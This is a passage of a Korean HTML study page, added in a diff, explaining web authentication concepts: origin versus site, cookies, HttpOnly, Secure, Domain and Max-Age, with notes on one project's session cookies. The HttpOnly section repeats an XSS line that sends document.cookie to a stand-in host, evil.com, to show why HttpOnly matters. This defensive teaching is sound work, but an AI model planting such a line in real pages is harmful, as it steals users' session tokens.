@@ -1,0 +1,2379 @@
+<!doctype html>
+<html lang="ko">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>01 웹 인증 개념</title>
+    <link rel="stylesheet" href="../learn.css" />
+    <script src="../vendor/highlightjs/highlight.min.js" defer></script>
+    <script src="../learn.js" defer></script>
+  </head>
+  <body>
+    <div class="layout">
+      <nav aria-label="목차">
+        <strong>목차</strong>
+        <ol>
+          <li><a href="#origin">출처와 사이트</a></li>
+          <li><a href="#cookie">쿠키 기본</a></li>
+          <li><a href="#httponly">HttpOnly</a></li>
+          <li><a href="#secure">Secure</a></li>
+          <li><a href="#domain">Domain과 호스트 전용 쿠키</a></li>
+          <li><a href="#max-age">Max-Age: 영속 쿠키와 세션 쿠키</a></li>
+          <li><a href="#cookie-prefix">쿠키 이름 접두사</a></li>
+          <li><a href="#samesite">SameSite</a></li>
+          <li><a href="#hash">해시 함수</a></li>
+          <li><a href="#encryption">암호화와 해시의 차이</a></li>
+          <li><a href="#hmac">HMAC: 비밀키로 만든 서명</a></li>
+          <li><a href="#salt">솔트</a></li>
+          <li><a href="#kdf">느린 해시: scrypt, bcrypt, Argon2</a></li>
+          <li><a href="#random">난수와 엔트로피</a></li>
+          <li><a href="#timing">타이밍 공격과 상수 시간 비교</a></li>
+          <li><a href="#enumeration">계정 열거</a></li>
+          <li><a href="#session-vs-jwt">세션과 JWT</a></li>
+          <li><a href="#session-fixation">세션 고정</a></li>
+          <li><a href="#csrf">CSRF</a></li>
+          <li><a href="#cors">CORS</a></li>
+          <li><a href="#check">점검 문제</a></li>
+        </ol>
+      </nav>
+
+      <main>
+        <h1>01 웹 인증 개념</h1>
+        <p class="lead">
+          인증 문서들이 안다고 보고 쓰는 웹 보안 개념을 모았다. 이 저장소의 코드와 상관없는 일반 개념만 다룬다.
+          처음부터 읽기보다, 다른 문서에서 링크로 넘어와 필요한 절만 읽는 참고 문서다. 새 개념이 필요해지면 이 문서에
+          절을 더한다.
+        </p>
+
+        <section id="origin">
+          <h2>출처와 사이트</h2>
+          <p>
+            브라우저 보안 규칙은 "같은 곳에서 온 요청인가"를 자주 묻는다. 이때 "같은 곳"의 기준이 두 가지 있다. 같은
+            주소 하나를 두 기준으로 잘라 보면 차이가 보인다.
+          </p>
+          <p><strong>출처로 볼 때:</strong> 색칠한 세 부분이 모두 같아야 같은 출처다.</p>
+          <div class="anatomy">
+            <span class="part blue" data-label="스킴">https://</span><span class="part blue" data-label="호스트 (전체)"
+              >store.example.com</span
+            ><span class="part blue" data-label="포트">:443</span><span class="part dim" data-label="경로 (안 봄)"
+              >/shows</span
+            >
+            <span class="anatomy-caption">https의 기본 포트 443은 주소에 보통 생략되지만, 비교할 때는 들어간다.</span>
+          </div>
+          <p><strong>사이트로 볼 때:</strong> 색칠한 두 부분만 같으면 같은 사이트다.</p>
+          <div class="anatomy">
+            <span class="part green" data-label="스킴">https://</span><span class="part dim" data-label="서브도메인 (안 봄)"
+              >store.</span
+            ><span class="part green" data-label="등록 가능한 도메인">example.com</span
+            ><span class="part dim" data-label="포트 (안 봄)">:443</span
+            ><span class="part dim" data-label="경로 (안 봄)">/shows</span>
+            <span class="anatomy-caption">사이트는 보는 부분이 적어서, 출처보다 넓은 묶음이 된다.</span>
+          </div>
+          <ul>
+            <li>
+              <strong>출처(origin)</strong>는 <code>스킴 + 호스트 + 포트</code>다. 세 개가 모두 같아야 같은 출처다.
+              <code>https://store.example.com</code>과 <code>https://api.example.com</code>은 호스트가 달라 다른 출처다.
+            </li>
+            <li>
+              <strong>사이트(site)</strong>는 더 넓다. 스킴과 "등록 가능한 도메인"(<code>example.com</code>처럼 돈 내고
+              사는 단위)이 같으면 같은 사이트다. 서브도메인과 포트는 보지 않는다. <code>store.example.com</code>과
+              <code>api.example.com</code>은 같은 사이트다.
+            </li>
+          </ul>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>A</th>
+                  <th>B</th>
+                  <th>같은 출처?</th>
+                  <th>같은 사이트?</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>https://example.com</code></td>
+                  <td><code>https://example.com/shows</code></td>
+                  <td>같다 (경로는 보지 않는다)</td>
+                  <td>같다</td>
+                </tr>
+                <tr>
+                  <td><code>https://store.example.com</code></td>
+                  <td><code>https://api.example.com</code></td>
+                  <td>다르다 (호스트)</td>
+                  <td>같다</td>
+                </tr>
+                <tr>
+                  <td><code>http://localhost:3000</code></td>
+                  <td><code>http://localhost:3001</code></td>
+                  <td>다르다 (포트)</td>
+                  <td>같다</td>
+                </tr>
+                <tr>
+                  <td><code>https://example.com</code></td>
+                  <td><code>http://example.com</code></td>
+                  <td>다르다 (스킴)</td>
+                  <td>다르다 (요즘 브라우저는 스킴도 본다)</td>
+                </tr>
+                <tr>
+                  <td><code>https://example.com</code></td>
+                  <td><code>https://evil.com</code></td>
+                  <td>다르다</td>
+                  <td>다르다</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            어떤 도메인이 "등록 가능한 단위"인지는 공개 접미사 목록(Public Suffix List)으로 정한다. 그래서
+            <code>a.github.io</code>와 <code>b.github.io</code>는 서로 다른 사이트다. <code>github.io</code>가 공개
+            접미사이기 때문이다.
+          </p>
+          <div class="anatomy">
+            <span class="part green" data-label="스킴">https://</span><span class="part dim" data-label="서브도메인"
+              >a.</span
+            ><span class="part green" data-label="등록 가능한 도메인">github.io</span>
+            <span class="anatomy-caption"
+              ><code>com</code>처럼 <code>github.io</code>도 공개 접미사라, 그 바로 아래 <code>a.github.io</code>까지가 등록
+              가능한 도메인이다. 그래서 <code>a.github.io</code>와 <code>b.github.io</code>는 서로 남이다.</span
+            >
+          </div>
+          <p>
+            이 프로젝트의 로컬 환경이 바로 "다른 출처, 같은 사이트"다. 스토어는 <code>http://localhost:3001</code>, API는
+            <code>http://localhost:3000</code>이다. 포트가 달라 출처는 다르고, 사이트는 같다. 그래서 스토어가 API를 부를
+            때 브라우저에서 직접 부르면 CORS 허용이 필요하지만, SameSite 쿠키는 막히지 않는다.
+          </p>
+          <p>
+            브라우저는 다른 출처로 요청을 보낼 때 <code>Origin</code> 헤더에 요청을 보낸 페이지의 출처를 적는다.
+            페이지 자바스크립트가 이 헤더를 바꿀 수 없으므로, 서버는 이 값으로 요청이 어디서 왔는지 판단할 수 있다.
+          </p>
+          <div class="scenes">
+            <div class="scene">
+              <div class="scene-title">스토어 페이지가 API로 로그아웃 요청을 보낸다</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://<b>store.example.com</b>/my</div>
+                <div class="scene-page">"로그아웃" 버튼을 누른다</div>
+              </div>
+              <div class="scene-req">POST /auth/sign-out<br />Origin: https://store.example.com</div>
+              <div class="scene-server">api.example.com<small>Origin 헤더를 읽는다</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict"
+                  >브라우저가 보고 있던 페이지의 출처를 대신 적어 준다 → <strong>서버는 어디서 온 요청인지 안다</strong></span
+                >
+              </div>
+            </div>
+          </div>
+          <pre><code>POST /auth/sign-out HTTP/1.1
+Host: api.example.com
+Origin: https://store.example.com</code></pre>
+          <div class="callout">
+            <p>
+              <a href="#cors">CORS</a>는 출처를, <a href="#samesite">SameSite</a>는 사이트를 기준으로 판단한다. 둘을
+              헷갈리면 "같은 회사 서브도메인끼리인데 왜 막히지?", "다른 서브도메인인데 왜 안 막히지?"가 생긴다.
+            </p>
+          </div>
+        </section>
+
+        <section id="cookie">
+          <h2>쿠키 기본</h2>
+          <p>
+            HTTP는 요청마다 따로 논다. 서버는 방금 요청을 보낸 사람이 아까 로그인한 그 사람인지 모른다. 쿠키는 서버가
+            브라우저에 맡겨 두는 작은 쪽지다. 한 번 맡기면 브라우저가 그 서버로 가는 요청마다 쪽지를 다시 보여 준다.
+            놀이공원에서 손등에 찍어 주는 도장과 비슷하다. 한 번 찍으면 놀이기구를 탈 때마다 손등을 내밀면 된다.
+          </p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>브라우저</li>
+              <li>서버</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="2">POST /login</li>
+              <li class="reply" data-from="2" data-to="1">200 OK <small>Set-Cookie: sid=abc123; HttpOnly; Path=/</small></li>
+              <li data-at="1">쿠키 저장소에 sid=abc123 보관</li>
+              <li data-from="1" data-to="2">GET /me <small>Cookie: sid=abc123</small></li>
+              <li data-from="1" data-to="2">GET /orders <small>Cookie: sid=abc123</small></li>
+            </ol>
+          </div>
+          <p>
+            서버는 응답의 <code>Set-Cookie</code> 헤더로 쿠키를 맡긴다. <code>이름=값</code> 뒤에 세미콜론으로 속성을
+            붙인다. 속성은 "언제, 어디로 보낼지"를 정하는 규칙이고, 브라우저만 읽는다. 다시 보낼 때는 이름과 값만
+            <code>Cookie</code> 헤더에 실린다.
+          </p>
+          <p><strong>서버가 맡길 때 (응답의 Set-Cookie)</strong></p>
+          <div class="anatomy">
+            <span class="part dim" data-label="헤더 이름">Set-Cookie:&nbsp;</span><span class="part green" data-label="이름"
+              >sid</span
+            ><span class="part dim" data-label="">=</span><span class="part green" data-label="값">abc123</span
+            ><span class="part blue" data-label="보관 기간">; Max-Age=604800</span
+            ><span class="part blue" data-label="경로">; Path=/</span
+            ><span class="part blue" data-label="호스트">; Domain=example.com</span
+            ><span class="part blue" data-label="HTTPS만">; Secure</span
+            ><span class="part blue" data-label="JS에서 숨김">; HttpOnly</span
+            ><span class="part blue" data-label="다른 사이트">; SameSite=Lax</span>
+            <span class="anatomy-caption"
+              >초록이 쿠키 자체, 파랑은 브라우저에게 주는 보관 규칙이다. 규칙은 서버로 다시 돌아오지 않는다.</span
+            >
+          </div>
+          <p><strong>브라우저가 돌려줄 때 (요청의 Cookie)</strong></p>
+          <div class="anatomy">
+            <span class="part dim" data-label="헤더 이름">Cookie:&nbsp;</span><span class="part green" data-label="쿠키 1"
+              >sid=abc123</span
+            ><span class="part dim" data-label="">;&nbsp;</span><span class="part green" data-label="쿠키 2"
+              >theme=dark</span
+            >
+            <span class="anatomy-caption"
+              >이름=값만 실린다. 이 요청에 보낼 조건(경로, 호스트, HTTPS, SameSite)을 통과한 쿠키가 모두 한 줄로
+              붙는다.</span
+            >
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>속성</th>
+                  <th>정하는 것</th>
+                  <th>절</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>Max-Age</code>, <code>Expires</code></td>
+                  <td>언제까지 보관하나</td>
+                  <td><a href="#max-age">Max-Age</a></td>
+                </tr>
+                <tr>
+                  <td><code>Domain</code></td>
+                  <td>어느 호스트로 보내나</td>
+                  <td><a href="#domain">Domain</a></td>
+                </tr>
+                <tr>
+                  <td><code>Path</code></td>
+                  <td>어느 경로 아래로 보내나. <code>Path=/</code>면 모든 경로</td>
+                  <td>이 절</td>
+                </tr>
+                <tr>
+                  <td><code>Secure</code></td>
+                  <td>HTTPS로만 보내나</td>
+                  <td><a href="#secure">Secure</a></td>
+                </tr>
+                <tr>
+                  <td><code>HttpOnly</code></td>
+                  <td>자바스크립트에서 숨기나</td>
+                  <td><a href="#httponly">HttpOnly</a></td>
+                </tr>
+                <tr>
+                  <td><code>SameSite</code></td>
+                  <td>다른 사이트에서 시작된 요청에도 보내나</td>
+                  <td><a href="#samesite">SameSite</a></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            쿠키를 지우는 별도 명령은 없다. 같은 이름, 같은 <code>Domain</code>과 <code>Path</code>로 이미 지난 만료를
+            적은 <code>Set-Cookie</code>를 보내면 브라우저가 지운다. 속성이 다르면 브라우저는 다른 쿠키로 보고 지우지
+            않는다. Express의 <code>res.clearCookie(name, options)</code>가 이 일을 하며, 구울 때와 같은 옵션을 넘겨야 하는
+            이유다.
+          </p>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">같은 이름, 같은 Path로 지난 날짜를 보내면</span>
+              <span class="pipe-val">sid=abc123<small>저장된 쿠키, Path=/</small></span>
+              <span class="pipe-fn">Set-Cookie: sid=; Path=/; Expires=1970년</span>
+              <span class="pipe-val ok">지워진다</span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">Path가 다르면</span>
+              <span class="pipe-val">sid=abc123<small>저장된 쿠키, Path=/</small></span>
+              <span class="pipe-fn">Set-Cookie: sid=; Path=/auth; Expires=1970년</span>
+              <span class="pipe-val bad">그대로 남는다</span>
+              <span class="pipe-note">브라우저는 Path=/auth인 다른 쿠키를 지우려는 것으로 본다</span>
+            </div>
+          </div>
+          <pre><code class="language-ts">// Express
+res.cookie('sid', 'abc123', { httpOnly: true, path: '/' }); // Set-Cookie: sid=abc123; Path=/; HttpOnly
+res.clearCookie('sid', { httpOnly: true, path: '/' }); // Set-Cookie: sid=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly</code></pre>
+          <p>
+            브라우저의 <code>fetch</code>는 같은 출처 요청에는 쿠키를 싣지만, 다른 출처로 보낼 때는
+            <code>credentials: 'include'</code>를 켜야 쿠키를 싣고, 응답의 <code>Set-Cookie</code>도 받아들인다.
+          </p>
+          <div class="scenes">
+            <div class="scene cross">
+              <div class="scene-title">credentials를 켜지 않고 부른다</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://<b>store.example.com</b></div>
+                <div class="scene-page"><code>fetch('https://api.example.com/me')</code></div>
+              </div>
+              <div class="scene-req">GET /me<br />(Cookie 없음)</div>
+              <div class="scene-server">api.example.com<small>로그인 안 한 요청으로 본다</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict">다른 출처로 가는 fetch의 기본값 → <strong>쿠키를 싣지 않는다</strong></span>
+                <ul class="scene-chips" data-legend="요청에 실리나">
+                  <li class="no">쿠키</li>
+                </ul>
+              </div>
+            </div>
+            <div class="scene">
+              <div class="scene-title">credentials: 'include'로 부른다</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://<b>store.example.com</b></div>
+                <div class="scene-page"><code>fetch(url, { credentials: 'include' })</code></div>
+              </div>
+              <div class="scene-req">GET /me<br />Cookie: sid=abc123</div>
+              <div class="scene-server">api.example.com<small>세션을 찾는다</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict">명시적으로 켰다 → <strong>쿠키를 싣는다</strong></span>
+                <ul class="scene-chips" data-legend="요청에 실리나">
+                  <li class="yes">쿠키</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <pre><code class="language-ts">// store.example.com의 페이지에서 api.example.com으로
+await fetch('https://api.example.com/me', { credentials: 'include' });</code></pre>
+        </section>
+
+        <section id="httponly">
+          <h2>HttpOnly</h2>
+          <p>
+            <code>HttpOnly</code>를 붙인 쿠키는 <code>document.cookie</code>에 나타나지 않는다. 페이지 자바스크립트는 읽지도
+            쓰지도 못하고, 브라우저가 요청에 실어 보내기만 한다.
+          </p>
+          <p>
+            브라우저 쿠키 저장소에 <code>sid=abc123</code>(HttpOnly)과 <code>theme=dark</code>(일반)가 함께 있다고 하자.
+            같은 저장소라도 꺼내 가는 길에 따라 보이는 것이 다르다.
+          </p>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">페이지 자바스크립트가 읽을 때</span>
+              <span class="pipe-val">sid=abc123 🔒<br />theme=dark<small>쿠키 저장소</small></span>
+              <span class="pipe-fn">document.cookie</span>
+              <span class="pipe-val">'theme=dark'</span>
+              <span class="pipe-note">sid는 아예 보이지 않는다</span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">브라우저가 요청에 실을 때</span>
+              <span class="pipe-val">sid=abc123 🔒<br />theme=dark<small>쿠키 저장소</small></span>
+              <span class="pipe-fn green">요청에 싣기</span>
+              <span class="pipe-val ok">Cookie: sid=abc123; theme=dark</span>
+              <span class="pipe-note">서버에는 둘 다 간다</span>
+            </div>
+          </div>
+          <pre><code class="language-ts">// Set-Cookie: sid=abc123; HttpOnly
+// Set-Cookie: theme=dark
+document.cookie; // 'theme=dark'  ← sid는 보이지 않는다</code></pre>
+          <p>
+            막으려는 것은 XSS(남이 심은 스크립트가 내 페이지에서 실행되는 것)로 세션 토큰을 훔쳐 가는 일이다. 토큰이
+            스크립트에 보이면 <code>fetch('https://evil.com?c=' + document.cookie)</code> 한 줄로 공격자 서버에 넘어가고,
+            공격자는 자기 컴퓨터에서 그 토큰으로 계속 로그인한다.
+          </p>
+          <div class="scenes">
+            <div class="scene danger">
+              <div class="scene-title">HttpOnly가 없으면: 토큰이 공격자 서버로 간다</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://store.example.com/reviews/12</div>
+                <div class="scene-page">
+                  후기 글에 심어진 스크립트<br /><code>fetch('https://evil.com?c=' + document.cookie)</code>
+                </div>
+              </div>
+              <div class="scene-req">GET evil.com<br />?c=sid=abc123</div>
+              <div class="scene-server">evil.com<small>공격자 서버</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict"
+                  >공격자가 <code>sid=abc123</code>을 자기 브라우저에 넣는다 → <strong>사용자로 계속 로그인</strong></span
+                >
+              </div>
+            </div>
+            <div class="scene">
+              <div class="scene-title">HttpOnly가 있으면: 빈손으로 간다</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://store.example.com/reviews/12</div>
+                <div class="scene-page">
+                  같은 스크립트<br /><code>fetch('https://evil.com?c=' + document.cookie)</code>
+                </div>
+              </div>
+              <div class="scene-req">GET evil.com<br />?c=theme=dark</div>
+              <div class="scene-server">evil.com<small>공격자 서버</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict"
+                  ><code>document.cookie</code>에 sid가 없다 → <strong>토큰은 새어 나가지 않는다</strong></span
+                >
+              </div>
+            </div>
+          </div>
+          <div class="callout warn">
+            <p>
+              <code>HttpOnly</code>는 토큰을 <strong>가져가는</strong> 것만 막는다. XSS 스크립트가 그 페이지 안에서
+              <code>fetch('/orders', { method: 'POST' })</code>를 보내면 브라우저는 쿠키를 그대로 싣는다. XSS 자체는
+              입력을 이스케이프하는 등 다른 방법으로 막아야 한다.
+            </p>
+          </div>
+          <p>
+            세션 토큰을 <code>localStorage</code>에 두면 이 보호를 받을 수 없다. <code>localStorage</code>는 늘
+            자바스크립트에 보이기 때문이다.
+          </p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>토큰을 둔 곳</th>
+                  <th>XSS 스크립트가 읽을 수 있나</th>
+                  <th>요청에 저절로 실리나</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>HttpOnly 쿠키 (이 프로젝트)</td>
+                  <td>없다</td>
+                  <td>실린다</td>
+                </tr>
+                <tr>
+                  <td>일반 쿠키</td>
+                  <td>있다 (<code>document.cookie</code>)</td>
+                  <td>실린다</td>
+                </tr>
+                <tr>
+                  <td><code>localStorage</code></td>
+                  <td>있다 (<code>localStorage.getItem</code>)</td>
+                  <td>안 실린다. 코드가 헤더에 직접 넣는다</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            이 프로젝트의 세션 쿠키는 늘 <code>HttpOnly</code>다(<code>apps/api/src/auth/session-manager.ts</code>의
+            <code>httpOnly: true</code>).
+          </p>
+        </section>
+
+        <section id="secure">
+          <h2>Secure</h2>
+          <p>
+            <code>Secure</code>를 붙인 쿠키는 HTTPS 요청에만 실린다. HTTP는 내용이 암호화되지 않아, 같은 와이파이에 있는
+            사람이 요청을 엿보면 쿠키가 그대로 보인다. 운영 환경에서 세션 쿠키에는 늘 붙인다.
+          </p>
+          <p><strong>Secure가 없을 때: 카페 와이파이에서 http 주소로 들어가면</strong></p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>사용자 브라우저</li>
+              <li>같은 와이파이의 공격자</li>
+              <li>example.com</li>
+            </ol>
+            <ol class="seq-steps">
+              <li class="seq-note">사용자가 주소창에 http://example.com 을 직접 입력했다</li>
+              <li class="stop" data-from="1" data-to="3">GET http://example.com/ <small>Cookie: sid=abc123 (암호화 안 됨)</small></li>
+              <li class="stop" data-at="2">지나가는 요청에서 sid=abc123을 그대로 읽는다</li>
+              <li class="stop" data-from="2" data-to="3">GET /me <small>Cookie: sid=abc123 (훔친 쿠키)</small></li>
+            </ol>
+          </div>
+          <p>
+            <code>Secure</code>를 붙이면 1번 요청에 쿠키가 아예 실리지 않는다. 브라우저가 주소의 스킴을 보고 판단한다.
+          </p>
+          <div class="scenes">
+            <div class="scene">
+              <div class="scene-title">https 주소로 가는 요청</div>
+              <div class="scene-browser">
+                <div class="scene-url"><b>https://</b>example.com</div>
+                <div class="scene-page">"내 예매"를 누른다</div>
+              </div>
+              <div class="scene-req">GET /me<br />Cookie: sid=abc123</div>
+              <div class="scene-server">example.com<small>내용이 암호화되어 간다</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict">https → <strong>Secure 쿠키를 싣는다</strong></span>
+                <ul class="scene-chips" data-legend="요청에 실리나">
+                  <li class="yes">Secure 쿠키</li>
+                  <li class="yes">일반 쿠키</li>
+                </ul>
+              </div>
+            </div>
+            <div class="scene cross">
+              <div class="scene-title">http 주소로 가는 요청</div>
+              <div class="scene-browser">
+                <div class="scene-url"><b>http://</b>example.com</div>
+                <div class="scene-page">주소를 http로 직접 입력했다</div>
+              </div>
+              <div class="scene-req">GET /<br />(Secure 쿠키 없음)</div>
+              <div class="scene-server">example.com<small>누구나 엿볼 수 있는 길</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict">http → <strong>Secure 쿠키는 빼고 보낸다</strong></span>
+                <ul class="scene-chips" data-legend="요청에 실리나">
+                  <li class="no">Secure 쿠키</li>
+                  <li class="yes">일반 쿠키</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <p>
+            로컬 개발 서버는 보통 <code>http://localhost</code>다. 요즘 브라우저는 <code>localhost</code>를 예외로 보고
+            Secure 쿠키를 허용하기도 하지만, 브라우저마다 다를 수 있다. 그래서 로컬에서는 <code>Secure</code>를 끄고
+            운영에서만 켜는 설정을 흔히 쓴다.
+          </p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>이 프로젝트</th>
+                  <th>주소</th>
+                  <th>세션 쿠키</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>로컬</td>
+                  <td><code>http://localhost:3000</code></td>
+                  <td><code>openrun.session_token=…; HttpOnly; SameSite=Lax</code> (Secure 없음)</td>
+                </tr>
+                <tr>
+                  <td>운영 (<code>NODE_ENV=production</code>)</td>
+                  <td>https</td>
+                  <td><code>__Secure-openrun.session_token=…; Secure; HttpOnly; SameSite=Lax</code></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            이 선택은 <code>apps/api/src/config/env.ts</code>의 <code>shouldUseSecureCookies</code>가 정한다. 이름 앞의
+            <code>__Secure-</code>는 <a href="#cookie-prefix">쿠키 이름 접두사</a>에서 다룬다.
+          </p>
+        </section>
+
+        <section id="domain">
+          <h2>Domain과 호스트 전용 쿠키</h2>
+          <p>
+            <code>Domain</code>은 쿠키를 어느 호스트로 보낼지 정한다. 생략했을 때와 적었을 때 동작이 크게 다르다.
+            <code>api.example.com</code>이 로그인 응답으로 쿠키를 구운 뒤, 브라우저가 두 서버로 요청을 보내는 장면을
+            비교해 보자.
+          </p>
+          <p><strong>Domain을 생략하면: 구운 호스트에만 간다</strong></p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>브라우저</li>
+              <li>api.example.com</li>
+              <li>store.example.com</li>
+            </ol>
+            <ol class="seq-steps">
+              <li class="reply" data-from="2" data-to="1">Set-Cookie: sid=abc123; Path=/ <small>Domain 없음</small></li>
+              <li data-from="1" data-to="2">GET /me <small>Cookie: sid=abc123</small></li>
+              <li class="stop" data-from="1" data-to="3">GET /my-page <small>쿠키 없음</small></li>
+            </ol>
+          </div>
+          <p><strong>Domain=example.com을 적으면: 상위 도메인과 모든 서브도메인으로 간다</strong></p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>브라우저</li>
+              <li>api.example.com</li>
+              <li>store.example.com</li>
+            </ol>
+            <ol class="seq-steps">
+              <li class="reply" data-from="2" data-to="1">Set-Cookie: sid=abc123; Path=/; Domain=example.com</li>
+              <li data-from="1" data-to="2">GET /me <small>Cookie: sid=abc123</small></li>
+              <li data-from="1" data-to="3">GET /my-page <small>Cookie: sid=abc123</small></li>
+            </ol>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th><code>api.example.com</code>이 보낸 Set-Cookie</th>
+                  <th><code>api.example.com</code></th>
+                  <th><code>store.example.com</code></th>
+                  <th><code>example.com</code></th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>Domain</code> 없음 (호스트 전용 쿠키)</td>
+                  <td>보낸다</td>
+                  <td>보내지 않는다</td>
+                  <td>보내지 않는다</td>
+                </tr>
+                <tr>
+                  <td><code>Domain=example.com</code></td>
+                  <td>보낸다</td>
+                  <td>보낸다</td>
+                  <td>보낸다</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <ul>
+            <li>
+              <strong>생략하면 호스트 전용 쿠키</strong>다. 쿠키를 구운 호스트에만, 정확히 그 이름으로 간다. 서브도메인에도
+              가지 않는다. 가장 좁고 안전하다.
+            </li>
+            <li>
+              <strong>상위 도메인을 적으면</strong> 그 도메인과 모든 서브도메인으로 간다. <code>api.example.com</code>이
+              구운 쿠키를 <code>store.example.com</code>의 서버도 받아야 할 때 쓴다.
+            </li>
+            <li>
+              쿠키를 굽는 호스트 자신이거나 그 상위 도메인만 적을 수 있다. <code>api.example.com</code>이
+              <code>Domain=other.com</code>이나 공개 접미사(<code>Domain=com</code>)를 적으면 브라우저가 쿠키를 버린다.
+            </li>
+          </ul>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">api.example.com이 보낸 Domain 값을 브라우저가 검사한다</span>
+              <span class="pipe-val">Domain=example.com</span>
+              <span class="pipe-fn">내 상위 도메인인가?</span>
+              <span class="pipe-val ok">받는다</span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-val">Domain=other.com</span>
+              <span class="pipe-fn">내 상위 도메인인가?</span>
+              <span class="pipe-val bad">버린다</span>
+              <span class="pipe-note">남의 도메인에 쿠키를 심을 수 없다</span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-val">Domain=com</span>
+              <span class="pipe-fn">공개 접미사인가?</span>
+              <span class="pipe-val bad">버린다</span>
+              <span class="pipe-note">모든 .com 사이트에 쿠키를 뿌릴 수 없다</span>
+            </div>
+          </div>
+          <p>
+            넓힐수록 쿠키를 받는 서버가 늘어난다. 서브도메인 중 하나라도 허술하면 그쪽에서 쿠키가 새어 나갈 수 있으므로,
+            필요할 때만 넓힌다.
+          </p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>이 프로젝트의 쿠키</th>
+                  <th>Domain</th>
+                  <th>이유</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>사용자 세션</td>
+                  <td>환경 변수 <code>COOKIE_DOMAIN</code>. 없으면 생략</td>
+                  <td>스토어와 API가 서브도메인으로 나뉘는 배포에서 스토어 서버도 쿠키를 받아야 한다</td>
+                </tr>
+                <tr>
+                  <td>운영자 세션</td>
+                  <td>늘 생략 (API 호스트 전용)</td>
+                  <td>어드민은 SPA라 서버 렌더링에서 쿠키를 읽을 일이 없다 (ADR 0010)</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <section id="max-age">
+          <h2>Max-Age: 영속 쿠키와 세션 쿠키</h2>
+          <p>
+            쿠키의 보관 기간은 <code>Max-Age</code>(지금부터 몇 초)나 <code>Expires</code>(날짜)로 정한다. 둘 다 있으면
+            <code>Max-Age</code>가 이긴다.
+          </p>
+          <ul>
+            <li>
+              <strong>영속 쿠키:</strong> <code>Max-Age</code>나 <code>Expires</code>가 있다. 브라우저를 껐다 켜도 그 기간까지
+              남는다.
+            </li>
+            <li>
+              <strong>세션 쿠키:</strong> 둘 다 없다. 브라우저 세션이 끝나면, 보통 브라우저를 닫으면 사라진다. 이름의
+              "세션"은 브라우저 세션을 뜻하며, 서버의 로그인 세션과는 다른 말이다.
+            </li>
+          </ul>
+          <div class="timeline" style="--tl-max: 8; --tl-label: 9rem" data-unit="일">
+            <div class="tl-row">
+              <span class="tl-label">영속 쿠키<small>Max-Age=604800 (7일)</small></span>
+              <div class="tl-track">
+                <span class="tl-bar blue" style="--from: 0; --to: 7">브라우저를 닫아도 남는다</span>
+                <span class="tl-event" style="--at: 2.5">브라우저 닫음</span>
+              </div>
+            </div>
+            <div class="tl-row">
+              <span class="tl-label">세션 쿠키<small>Max-Age 없음</small></span>
+              <div class="tl-track">
+                <span class="tl-bar green" style="--from: 0; --to: 2.5">닫을 때까지</span>
+                <span class="tl-event" style="--at: 2.5">브라우저 닫음</span>
+              </div>
+            </div>
+          </div>
+          <div class="callout warn">
+            <p>
+              Chrome의 "시작할 때 이전 탭 다시 열기"처럼 세션을 복원하는 설정을 켜면 세션 쿠키도 살아남을 수 있다.
+              그래서 쿠키가 사라지는 것에만 기대지 말고, 서버에도 만료를 따로 둔다.
+            </p>
+          </div>
+          <p>
+            이 프로젝트는 로그인 요청의 <code>rememberMe</code>(로그인 상태 유지) 값으로 이 둘을 고른다. 켜면 <code>Max-Age</code>를 붙인 영속 쿠키,
+            끄면 <code>Max-Age</code> 없는 세션 쿠키를 굽는다. 어느 쪽이든 서버의 세션 행에도 만료 시각이 따로 있다(켜면
+            7일, 끄면 1일).
+          </p>
+          <p>
